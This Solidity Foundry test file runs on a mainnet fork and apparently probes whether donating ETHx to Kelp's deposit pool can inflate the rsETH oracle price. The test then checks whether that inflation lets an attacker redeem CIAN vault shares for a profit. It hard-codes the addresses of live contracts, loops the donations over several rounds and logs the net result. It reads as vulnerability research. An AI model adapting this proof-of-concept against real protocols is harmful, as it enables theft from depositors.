// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*//////////////////////////////////////////////////////////////
    PHASE 2c: Correction of Phase 2b's mistake. depositAsset()
    mints rsETH proportionally in the SAME call (price-neutral by
    design - that's why Phase 2b's "legitimate deposit" ratchet
    measured ZERO manipulation). The balanceOf-inflation bug ONLY
    fires on a PURE, uncompensated donation (plain transfer, no
    mint) - exactly what Phase 2's original (single-shot) test
    used. This version:

    1. Re-runs the FINE sweep (bps 1-10) using pure donation, and
       logs Kelp's own rsETHPrice before/after each step (missing
       from Phase 2 - needed to compute the real amplification
       factor between a Kelp-side price move and CIAN's
       exchangePrice response).
    2. Runs a multi-round PURE-DONATION ratchet (cost accumulates
       every round, unlike Phase 2b) to test whether compounding
       via highestRsethPrice's ratchet mechanic ever overcomes the
       linear cost growth.

    RUN:
      forge test --match-test testFineDonationSweep -vv --fork-url "$MAINNET_RPC_URL"
      forge test --match-test testDonationRatchet -vv --fork-url "$MAINNET_RPC_URL"
//////////////////////////////////////////////////////////////*/

interface IKelpOracle {
    function rsETHPrice() external view returns (uint256);
    function highestRsethPrice() external view returns (uint256);
    function pricePercentageLimit() external view returns (uint256);
    function updateRSETHPrice() external;
}

interface ICianVaultFull {
    function exchangePrice() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function updateExchangePrice() external returns (uint256 newExchangePrice, uint256 newRevenue);
    function requestRedeem(uint256 _shares, address _token) external;
    function optionalDeposit(address _token, uint256 _assets, address _receiver, address _referral)
        external
        payable
        returns (uint256 shares_);
}

interface IRedeemOperator {
    function confirmWithdrawal(address[] calldata _users, uint256 _totalGasTokenAmount) external;
}

interface IERC20Approve {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AtomicForwarder {
    function doBoth(address vault, address redeemOperator, address[] calldata users, uint256 gasAmt) external {
        ICianVaultFull(vault).updateExchangePrice();
        IRedeemOperator(redeemOperator).confirmWithdrawal(users, gasAmt);
    }
}

contract CianKelpOracle_Phase2c_Test is Test {
    address constant CIAN_VAULT = 0xd87a19fF681AE98BF10d2220D1AE3Fbd374ADE4e;
    address constant CIAN_MANAGER = 0xAc1894C6914639e18f8FA69FEBd324eE91c96065;
    address constant REDEEM_OPERATOR = 0x47dbd71db64617f6cbd45eb9d9ba876f40ed239e;
    address constant KELP_DEPOSIT_POOL = 0x036676389e48133B63a802f8635AD39E752D375D;
    address constant KELP_ORACLE = 0x349A73444b1a310BAe67ef67973022020d70020d;
    address constant RSETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address constant ETHx = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;

    address attacker = makeAddr("attacker");
    uint256 constant ATTACKER_DEPOSIT = 10 ether;

    function setUp() public {
        deal(ETHx, attacker, 50_000_000 ether, true);
    }

    /*//////////////////////////////////////////////////////////////
        TEST A: fine sweep with PURE DONATION, logging Kelp price
        before/after each step to compute the real amplification
        factor into CIAN's exchangePrice.
    //////////////////////////////////////////////////////////////*/
    function testFineDonationSweep() public {
        uint256 rsethSupply = IERC20(RSETH).totalSupply();
        uint256 rsethPrice0 = IKelpOracle(KELP_ORACLE).rsETHPrice();
        uint256 kelpTvlInEth = (rsethSupply * rsethPrice0) / 1e18;

        console2.log("Kelp TVL (ETH-eq):", kelpTvlInEth);
        console2.log("bps | donateETHx | blocked | kelpPriceBefore | kelpPriceAfter | kelpDeltaBps");
        console2.log("----|------------|---------|------------------|------------------|-------------");

        uint16[10] memory fineBps = [uint16(1), 2, 3, 4, 5, 6, 7, 8, 9, 10];
        for (uint256 i = 0; i < fineBps.length; i++) {
            uint256 snap = vm.snapshotState();

            uint256 amount = (kelpTvlInEth * fineBps[i]) / 10_000;
            deal(ETHx, attacker, amount, true);
            vm.prank(attacker);
            IERC20(ETHx).transfer(KELP_DEPOSIT_POOL, amount); // PURE donation, no mint

            uint256 priceBefore = IKelpOracle(KELP_ORACLE).rsETHPrice();
            bool blocked;
            vm.prank(attacker);
            try IKelpOracle(KELP_ORACLE).updateRSETHPrice() {
                blocked = false;
            } catch {
                blocked = true;
            }
            uint256 priceAfter = IKelpOracle(KELP_ORACLE).rsETHPrice();
            uint256 deltaBps = priceBefore == 0 ? 0 : ((priceAfter - priceBefore) * 10000) / priceBefore;

            console2.log(
                string.concat(
                    vm.toString(fineBps[i]), " | ", vm.toString(amount), " | ", blocked ? "YES" : "no"
                )
            );
            console2.log("    kelpPriceBefore:", priceBefore, " kelpPriceAfter:", priceAfter);
            console2.log("    kelpDeltaBps:", deltaBps);

            vm.revertToState(snap);
        }
    }

    /*//////////////////////////////////////////////////////////////
        TEST B: multi-round PURE-DONATION ratchet - cost accumulates
        every round (unlike Phase 2b), measuring whether compounding
        ever beats the linear cost growth.
    //////////////////////////////////////////////////////////////*/
    function testDonationRatchet() public {
        uint256 rsethSupply = IERC20(RSETH).totalSupply();
        uint256 rsethPrice0 = IKelpOracle(KELP_ORACLE).rsETHPrice();
        uint256 kelpTvlInEth = (rsethSupply * rsethPrice0) / 1e18;

        // tune STEP_BPS down after testFineDonationSweep shows you the
        // real per-call threshold; start conservative at 1 bps
        uint256 STEP_BPS = 1;
        uint256 stepAmount = (kelpTvlInEth * STEP_BPS) / 10_000;
        uint256 ROUNDS = 25;

        console2.log("=== PURE-DONATION RATCHET ===");
        console2.log("stepAmount (ETHx) per round:", stepAmount);
        console2.log("rsETHPrice BEFORE:", rsethPrice0);

        // ---- attacker's CIAN-side position ----
        deal(ETHx, attacker, ATTACKER_DEPOSIT, true);
        vm.startPrank(attacker);
        IERC20Approve(ETHx).approve(CIAN_VAULT, ATTACKER_DEPOSIT);
        uint256 sharesReceived = ICianVaultFull(CIAN_VAULT).optionalDeposit(ETHx, ATTACKER_DEPOSIT, attacker, address(0));
        vm.stopPrank();

        uint256 exchPriceBefore = ICianVaultFull(CIAN_VAULT).exchangePrice();
        uint256 fairValueBefore = (sharesReceived * exchPriceBefore) / 1e18;

        vm.startPrank(attacker);
        IERC20Approve(CIAN_VAULT).approve(REDEEM_OPERATOR, sharesReceived);
        ICianVaultFull(CIAN_VAULT).requestRedeem(sharesReceived, RSETH);
        vm.stopPrank();

        // ---- donation ratchet loop (real, unrecovered cost each round) ----
        uint256 totalDonated;
        uint256 blockedAt = type(uint256).max;
        for (uint256 i = 0; i < ROUNDS; i++) {
            deal(ETHx, attacker, IERC20(ETHx).balanceOf(attacker) + stepAmount, true);
            vm.prank(attacker);
            IERC20(ETHx).transfer(KELP_DEPOSIT_POOL, stepAmount);
            totalDonated += stepAmount;

            vm.prank(attacker);
            try IKelpOracle(KELP_ORACLE).updateRSETHPrice() {
                // continue
            } catch {
                blockedAt = i;
                break;
            }
        }

        uint256 rsethPriceAfter = IKelpOracle(KELP_ORACLE).rsETHPrice();
        console2.log("ratchet stopped at round (max=ROUNDS if never blocked):", blockedAt == type(uint256).max ? ROUNDS : blockedAt);
        console2.log("rsETHPrice AFTER ratchet:", rsethPriceAfter);
        console2.log(
            "cumulative Kelp price move (bps):",
            ((rsethPriceAfter > rsethPrice0 ? rsethPriceAfter - rsethPrice0 : 0) * 10000) / rsethPrice0
        );
        console2.log("total ETHx donated (real, unrecovered cost):", totalDonated);

        // ---- final atomic redeem ----
        vm.etch(CIAN_MANAGER, address(new AtomicForwarder()).code);
        address[] memory users = new address[](1);
        users[0] = attacker;

        uint256 rsethBeforeRedeem = IERC20(RSETH).balanceOf(attacker);
        uint256 exchPriceAfter = exchPriceBefore;
        try AtomicForwarder(CIAN_MANAGER).doBoth(CIAN_VAULT, REDEEM_OPERATOR, users, 0) {
            exchPriceAfter = ICianVaultFull(CIAN_VAULT).exchangePrice();
        } catch Error(string memory reason) {
            console2.log("!! doBoth() reverted:", reason);
            return;
        } catch (bytes memory lowLevelData) {
            console2.log("!! doBoth() reverted, raw:");
            console2.logBytes(lowLevelData);
            return;
        }
        uint256 rsethFromRedeem = IERC20(RSETH).balanceOf(attacker) - rsethBeforeRedeem;

        // convert donation cost into RSETH terms at the post-attack Kelp price
        uint256 donationCostInRSETH = (totalDonated * 1e18) / rsethPriceAfter;

        console2.log("=== RESULT ===");
        console2.log("exchangePrice before:", exchPriceBefore);
        console2.log("exchangePrice after :", exchPriceAfter);
        console2.log("rsETH received from CIAN redeem:", rsethFromRedeem);
        console2.log("fair value of shares (pre-manipulation):", fairValueBefore);
        console2.log("donation cost in RSETH terms:", donationCostInRSETH);

        int256 netProfitRSETH = int256(rsethFromRedeem) - int256(fairValueBefore) - int256(donationCostInRSETH);
        console2.log("TRUE NET PROFIT (RSETH wei, negative = loss):");
        console2.logInt(netProfitRSETH);
    }
}
